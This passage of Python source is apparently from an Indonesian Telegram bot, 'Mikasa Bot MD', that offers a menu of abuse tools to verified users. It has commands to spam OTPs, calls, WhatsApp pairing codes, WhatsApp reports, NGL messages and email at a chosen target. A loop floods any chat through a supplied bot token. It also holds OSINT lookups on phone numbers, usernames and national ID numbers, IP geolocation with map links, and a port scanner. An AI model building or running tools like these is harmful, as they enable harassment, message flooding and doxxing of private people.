            query.message.edit_caption(
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

        elif data == "menu_osint":
            keyboard = [
                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption = (
                f" KATEGORI OSINT & TRACKING\n\n"
                f"╭───〔 2 〕───╮\n"
                f"│ 𝙊𝙎𝙄𝙉𝙏 & 𝙏𝙍𝘼𝘾𝙆𝙄𝙉𝙂 :\n"
                f"│ /osintnomor\n"
                f"│ /osintusername\n"
                f"│ /osintip\n"
                f"│ /osintdomain\n"
                f"│ /iptracker\n"
                f"│ /portscan\n"
                f"│ /nikparse\n"
                f"╰────────────────────────────╯\n\n"
                f"📌 *Cara penggunaan:*\n"
                f"Ketik command di atas dengan target\n"
                f"Contoh: /osintnomor +628xxxxxxxxx"
            )
            query.message.edit_caption(
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

        elif data == "menu_utility":
            keyboard = [
                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption = (
                f" KATEGORI UTILITY\n\n"
                f"╭───〔 3 〕───╮\n"
                f"│ 𝙐𝙏𝙄𝙇𝙄𝙏𝙔 𝙈𝙀𝙉𝙐 :\n"
                f"│ /cekkodepos\n"
                f"│ /ceknpsn\n"
                f"│ /ffuid\n"
                f"│ /cekroblox\n"
                f"│ /cekdataguru\n"
                f"│ /cekimei\n"
                f"│ /cekphising\n"
                f"│ /webrecon\n"
                f"│ /fototourl\n"
                f"│ /filetourl\n"
                f"│ /shortenerurl\n"
                f"│ /cekresi\n"
                f"╰────────────────────────────╯\n\n"
                f"📌 *Cara penggunaan:*\n"
                f"Ketik command di atas dengan target\n"
                f"Contoh: /cekkodepos 16112"
            )
            query.message.edit_caption(
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

        elif data == "menu_all":
            keyboard = [
                [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_back")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption = (
                f" 𝐌𝐄𝐍𝐔 𝐀𝐋𝐋 𝐌𝐈𝐊𝐀𝐒𝐀\n\n"
                f"╭───〔 ♛♛ 〕───╮\n"
                f"│ 𝙈𝙀𝙉𝙐 𝘽𝙊𝙏 𝙈𝙄𝙆𝘼𝙎𝘼🥘 :\n"
                f"│ /spamotp\n"
                f"│ /spamcall\n"
                f"│ /spampair\n"
                f"│ /spamrepwa\n"
                f"│ /spamngl\n"
                f"│ /osint\n"
                f"│ /iptracker\n"
                f"│ /portscan\n"
                f"│ /nikparse\n"
                f"│ /cekkodepos\n"
                f"│ /ceknpsn\n"
                f"│ /ffuid\n"
                f"│ /cekroblox\n"
                f"│ /spamgmail\n"
                f"│ /cekdataguru\n"
                f"│ /spambottele\n"
                f"│ /cekimei\n"
                f"│ /cekphising\n"
                f"│ /webrecon\n"
                f"│ /laporbug\n"
                f"│ /fototourl\n"
                f"│ /filetourl\n"
                f"│ /killbottele\n"
                f"│ /cekinfobot\n"
                f"│ /shortenerurl\n"
                f"│ /hackstatuswa\n"
                f"│ /cekresi\n"
                f"│ /getidchatbot\n"
                f"╰────────────────────────────╯\n\n"
                f"📌 *Cara penggunaan:*\n"
                f"Ketik command di atas dengan format yang sesuai"
            )
            query.message.edit_caption(
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

        elif data == "menu_back":
            keyboard = [
                [InlineKeyboardButton("〔 1 〕𝐒𝐏𝐀𝐌 𝐌𝐄𝐍𝐔", callback_data="menu_spam")],
                [InlineKeyboardButton("〔 2 〕𝐎𝐒𝐈𝐍𝐓 & 𝐓𝐀𝐑𝐂𝐊𝐄𝐑", callback_data="menu_osint")],
                [InlineKeyboardButton("〔 3 〕𝐔𝐓𝐈𝐋𝐈𝐓𝐘", callback_data="menu_utility")],
                [InlineKeyboardButton("〔 4 〕𝐌𝐄𝐍𝐔 𝐀𝐋𝐋", callback_data="menu_all")],
                [InlineKeyboardButton("〔 5 〕𝐂𝐋𝐎𝐒𝐄", callback_data="menu_close")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            caption = (
                f"𝙈𝙄𝙆𝘼𝙎𝘼 𝘽𝙊𝙏 𝙈𝘿\n"
                f"𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
                f"𝙿𝚒𝚕𝚒𝚑 𝚔𝚊𝚝𝚎𝚐𝚘𝚛𝚒 𝚍𝚒 𝚋𝚊𝚠𝚊𝚑 👇"
            )
            query.message.edit_caption(
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=ParseMode.MARKDOWN
            )

        elif data == "menu_close":
            query.message.delete()

    def cmd_spam_pair(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_text(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆\n"
                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                f"/spampair 628xxxxxxxxx"
            )
            return

        nomor = args[0].strip()
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]

        update.message.reply_text(format_loading("Mengirim Kode Pairing"))

        try:
            success = run_spam_pairing(nomor)
            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    "KETIK /start FOR BACK",
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_spam_repwa(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐖𝐀\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/spamrepwa +628xxxxxxxxx"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        nomor = args[0].strip()
        update.message.reply_text(format_loading("Mengirim Spam Report"))

        try:
            results = run_spam_report(nomor)
            detail = "\n".join(results)
            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐑𝐄𝐏𝐎𝐑𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    f"📱 Target: `{nomor}`\n\n"
                    f"📋 *Detail:*\n{detail}"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_spam_ngl(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐍𝐆𝐋\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/spamngl username"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        username = args[0].strip()
        update.message.reply_text(format_loading("Mengirim Spam NGL"))

        try:
            success = run_spam_ngl(username)
            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐍𝐆𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    f"👤 Target: `{username}`\n"
                    f"✅ Berhasil: {success}/20"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_osint(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        update.message.reply_photo(
            photo=IMAGE,
            caption=(
                f"𝙏𝙊𝙊𝙇𝙎: 𝐎𝐒𝐈𝐍𝐓\n"
                f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
                f"𝙋𝙞𝙡𝙞𝙝:\n"
                f"/osintnomor +628xxxxxxxxx\n"
                f"/osintusername username\n"
                f"/osintip 8.8.8.8\n"
                f"/osintdomain google.com"
            ),
            parse_mode=ParseMode.MARKDOWN
        )

    def cmd_osint_nomor(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption="Gunakan: /osintnomor +628xxxxxxxxx",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        nomor = args[0].strip()
        update.message.reply_text(format_loading("Melakukan OSINT Nomor"))

        try:
            info = osint_nomor(nomor)
            if info:
                update.message.reply_text(
                    format_success(
                        "𝐎𝐒𝐈𝐍𝐓 𝐍𝐎𝐌𝐎𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📱 Nomor: `{info['nomor']}`\n"
                        f"✅ Valid: {info['valid']}\n"
                        f"📌 Negara: {info['negara']}\n"
                        f"📱 Operator: {info['operator']}\n"
                        f"🌐 Timezone: {info['timezone']}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("❌ Gagal OSINT")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_osint_username(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption="Gunakan: /osintusername username",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        username = args[0].strip()
        update.message.reply_text(format_loading("Melakukan OSINT Username"))

        try:
            found = osint_username(username)
            if found:
                msg = f"𝙊𝙎𝙄𝙉𝙏 𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 𝙎𝙀𝙇𝙀𝙎𝘼𝙄✅\n\n"
                for name, url in found:
                    msg += f"✅ {name}: {url}\n"
                update.message.reply_text(msg)
            else:
                update.message.reply_text(f"❌ Username `{username}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_osint_ip(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption="Gunakan: /osintip 8.8.8.8",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        ip = args[0].strip()
        update.message.reply_text(format_loading("Melakukan OSINT IP"))

        try:
            data = osint_ip(ip)
            if data and data.get('status') == 'success':
                update.message.reply_text(
                    format_success(
                        "𝐎𝐒𝐈𝐍𝐓 𝐈𝐏 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🌍 IP: `{data.get('query', 'N/A')}`\n"
                        f"📍 Negara: {data.get('country', 'N/A')}\n"
                        f"🏙️ Kota: {data.get('city', 'N/A')}\n"
                        f"📌 ISP: {data.get('isp', 'N/A')}\n"
                        f"🌐 Timezone: {data.get('timezone', 'N/A')}\n"
                        f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat', '')},{data.get('lon', '')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("❌ Gagal OSINT IP")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_osint_domain(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption="Gunakan: /osintdomain google.com",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        domain = args[0].strip()
        update.message.reply_text(format_loading("Melakukan OSINT Domain"))

        try:
            data = osint_domain(domain)
            if data:
                whois = data.get('whois', {})
                update.message.reply_text(
                    format_success(
                        "𝐎𝐒𝐈𝐍𝐓 𝐃𝐎𝐌𝐀𝐈𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🌍 Domain: `{data['domain']}`\n"
                        f"📌 IP: `{data['ip']}`\n"
                        f"📋 Registrar: {whois.get('registrar', 'N/A')}\n"
                        f"📅 Created: {whois.get('creation_date', 'N/A')}\n"
                        f"⏰ Expires: {whois.get('expiration_date', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Domain `{domain}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_ip_tracker(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/iptracker 8.8.8.8"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        ip = args[0].strip()
        update.message.reply_text(format_loading("Melacak IP"))

        try:
            data = tool_ip_tracker(ip)
            if data and data.get('status') == 'success':
                update.message.reply_text(
                    format_success(
                        "𝐈𝐏 𝐓𝐑𝐀𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"━━━ *INFORMASI IP* ━━━\n"
                        f"🌍 IP: `{data.get('query', 'N/A')}`\n"
                        f"📍 Negara: {data.get('country', 'N/A')} ({data.get('countryCode', '')})\n"
                        f"🗺️ Region: {data.get('regionName', 'N/A')}\n"
                        f"🏙️ Kota: {data.get('city', 'N/A')}\n"
                        f"📮 Kode Pos: {data.get('zip', 'N/A')}\n"
                        f"📌 ISP: {data.get('isp', 'N/A')}\n"
                        f"🏢 Organisasi: {data.get('org', 'N/A')}\n"
                        f"🌐 Timezone: {data.get('timezone', 'N/A')}\n"
                        f"📱 Mobile: {'Ya' if data.get('mobile') else 'Tidak'}\n"
                        f"🔒 Proxy/VPN: {'Ya' if data.get('proxy') else 'Tidak'}\n"
                        f"🗺️ *Google Maps:* https://maps.google.com/?q={data.get('lat', '')},{data.get('lon', '')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text("❌ Gagal melacak IP")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_port_scan(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍𝐍𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/portscan google.com"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
        update.message.reply_text(format_loading("Scanning Port"))

        try:
            result = tool_port_scanner(domain)
            if result:
                if result['open_ports']:
                    ports_text = "\n".join([f"🔓 {p['port']} ({p['name']})" for p in result['open_ports']])
                    update.message.reply_text(
                        format_success(
                            "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                            f"🌍 Target: `{domain}`\n"
                            f"📌 IP: `{result['ip']}`\n"
                            f"🔓 Port terbuka:\n{ports_text}"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
                else:
                    update.message.reply_text(
                        format_success(
                            "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                            f"🌍 Target: `{domain}`\n"
                            f"📌 IP: `{result['ip']}`\n"
                            f"❌ Tidak ada port terbuka"
                        ),
                        parse_mode=ParseMode.MARKDOWN
                    )
            else:
                update.message.reply_text("❌ Gagal scan port")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_nik_parse(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/nikparse 3307110101990001"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        nik = args[0].strip()
        if not nik.isdigit() or len(nik) != 16:
            update.message.reply_text("❌ NIK harus 16 digit angka!")
            return

        update.message.reply_text(format_loading("Mengecek NIK"))

        try:
            url = f"https://api.nexray.eu.cc/tools/nikparse?nik={nik}"
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                result = data.get('result', {})

                msg = (
                    f"📌 NIK: `{nik}`\n"
                    f"👤 Gender: {result.get('kelamin', 'N/A')}\n"
                    f"📅 Lahir: {result.get('lahir_lengkap', 'N/A')}\n"
                    f"📍 Provinsi: {result.get('provinsi', {}).get('nama', 'N/A')}\n"
                    f"🏙️ Kab/Kota: {result.get('kotakab', {}).get('nama', 'N/A')}\n"
                    f"📌 Kecamatan: {result.get('kecamatan', {}).get('nama', 'N/A')}"
                )
                update.message.reply_text(
                    format_success("𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅", msg),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ NIK `{nik}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_kodepos(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐊𝐎𝐃𝐄 𝐏𝐎𝐒\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekkodepos 16112"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        kode_pos = args[0].strip()
        if not kode_pos.isdigit() or len(kode_pos) != 5:
            update.message.reply_text("❌ Kode pos harus 5 digit!")
            return

        update.message.reply_text(format_loading("Mencari Kode Pos"))

        try:
            data = tool_cek_kode_pos(kode_pos)
            if data:
                update.message.reply_text(
                    format_success(
                        "𝐊𝐎𝐃𝐄 𝐏𝐎𝐒 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📮 Kode Pos: `{kode_pos}`\n"
                        f"📍 Nama: {data.get('nama', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Kode pos `{kode_pos}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_npsn(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐍𝐏𝐒𝐍\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/ceknpsn 40203594"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        npsn = args[0].strip()
        if not npsn.isdigit() or len(npsn) != 8:
            update.message.reply_text("❌ NPSN harus 8 digit!")
            return

        update.message.reply_text(format_loading("Mencari NPSN"))

        try:
            data = tool_cek_npsn(npsn)
            if data:
                update.message.reply_text(
                    format_success(
                        "𝐍𝐏𝐒𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🏫 Nama: {data.get('nama', 'N/A')}\n"
                        f"📮 NPSN: {data.get('npsn', 'N/A')}\n"
                        f"📍 Provinsi: {data.get('provinsi', 'N/A')}\n"
                        f"🏙️ Kab/Kota: {data.get('kabupaten', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ NPSN `{npsn}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_ff_uid(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐅 𝐔𝐈𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/ffuid 10353221131"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        uid = args[0].strip()
        if not uid.isdigit():
            update.message.reply_text("❌ UID harus angka!")
            return

        update.message.reply_text(format_loading("Mengecek UID Free Fire"))

        try:
            data = tool_freefire_checker(uid)
            if data:
                update.message.reply_text(
                    format_success(
                        "𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐔𝐈𝐃 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🆔 UID: `{data.get('uid', 'N/A')}`\n"
                        f"👤 Nama: {data.get('name', 'N/A')}\n"
                        f"📊 Level: {data.get('level', 'N/A')}\n"
                        f"🌍 Region: {data.get('region', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ UID `{uid}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_roblox(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekroblox Builderman"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        username = args[0].strip()
        update.message.reply_text(format_loading("Mengecek Akun Roblox"))

        try:
            data = tool_roblox_checker(username)
            if data:
                basic = data.get('basic', {})
                update.message.reply_text(
                    format_success(
                        "𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"🆔 ID: `{data.get('userId', 'N/A')}`\n"
                        f"👤 Username: {basic.get('name', 'N/A')}\n"
                        f"📅 Created: {basic.get('created', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Username `{username}` tidak ditemukan")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_spam_gmail(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋\n"
                    f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
                    f"/spamgmail target@gmail.com\n"
                    f"/spamgmail target@gmail.com | pesan yang ingin dikirim\n\n"
                    f"📌 Gunakan tanda | sebagai pemisah antara email dan pesan"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        full_text = ' '.join(args)
        if '|' in full_text:
            parts = full_text.split('|', 1)
            target_email = parts[0].strip()
            custom_message = parts[1].strip() if len(parts) > 1 else None
        else:
            target_email = full_text.strip()
            custom_message = None

        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target_email):
            update.message.reply_text("❌ Format email tidak valid!")
            return

        if custom_message and len(custom_message) > 4000:
            update.message.reply_text("❌ Pesan terlalu panjang! Maksimal 4000 karakter.")
            return

        total_senders = len(get_email_senders())
        update.message.reply_text(format_loading(f"Mengirim Spam Email ke {target_email}"))

        try:
            success, total = run_spam_gmail(target_email, custom_message)

            if custom_message:
                msg_preview = custom_message[:50] + ("..." if len(custom_message) > 50 else "")
                update.message.reply_text(
                    format_success(
                        "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📧 Target: `{target_email}`\n"
                        f"✅ Berhasil: {success}/{total} sender\n"
                        f"📝 Pesan: {msg_preview}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(
                    format_success(
                        "𝐒𝐏𝐀𝐌 𝐄𝐌𝐀𝐈𝐋 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"📧 Target: `{target_email}`\n"
                        f"✅ Berhasil: {success}/{total} sender"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_dataguru(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekdataguru 1234567890123456"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        keyword = args[0].strip()
        update.message.reply_text(format_loading("Mencari Data Guru"))

        try:
            data = tool_cek_gtk(keyword)
            if data:
                update.message.reply_text(
                    format_success(
                        "𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                        f"👤 Nama: {data.get('nama', 'N/A')}\n"
                        f"📮 NUPTK: {data.get('nuptk', 'N/A')}\n"
                        f"🏫 Sekolah: {data.get('sekolah', {}).get('nama', 'N/A')}\n"
                        f"📍 Provinsi: {data.get('sekolah', {}).get('m_propinsi', {}).get('keterangan', 'N/A')}"
                    ),
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                update.message.reply_text(f"❌ Data tidak ditemukan untuk `{keyword}`")
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_spam_bottele(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args or len(args) < 3:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
                    f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
                    f"/spambottele token idchat pesan"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        token = args[0].strip()
        chat_id = args[1].strip()
        pesan = ' '.join(args[2:])

        update.message.reply_text(format_loading("Mengirim Spam Bot Telegram"))

        try:
            success = 0
            for i in range(10):
                url = f"https://api.telegram.org/bot{token}/sendMessage"
                payload = {"chat_id": chat_id, "text": pesan}
                resp = requests.post(url, data=payload, timeout=10)
                if resp.status_code == 200:
                    success += 1
                time.sleep(0.5)

            update.message.reply_text(
                format_success(
                    "𝐒𝐏𝐀𝐌 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
                    f"✅ Berhasil: {success}/10\n"
                    f"📌 Chat ID: `{chat_id}`"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            update.message.reply_text(format_error(str(e)))

    def cmd_cek_imei(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_verified(user_id):
            update.message.reply_text("❌ *Akses Ditolak!*")
            return

        args = context.args
        if not args:
            update.message.reply_photo(
                photo=IMAGE,
                caption=(
                    f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐌𝐄𝐈\n"
                    f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
                    f"/cekimei 353911112345678"
                ),
                parse_mode=ParseMode.MARKDOWN
            )
            return

        imei = args[0].strip()
        if not imei.isdigit() or len(imei) < 14 or len(imei) > 17:
            update.message.reply_text("❌ IMEI harus 14-17 digit!")
            return

        update.message.reply_text(format_loading("Mengecek IMEI"))

        try:
            data = tool_cek_imei(imei)
            if data:
                update.message.reply_text(
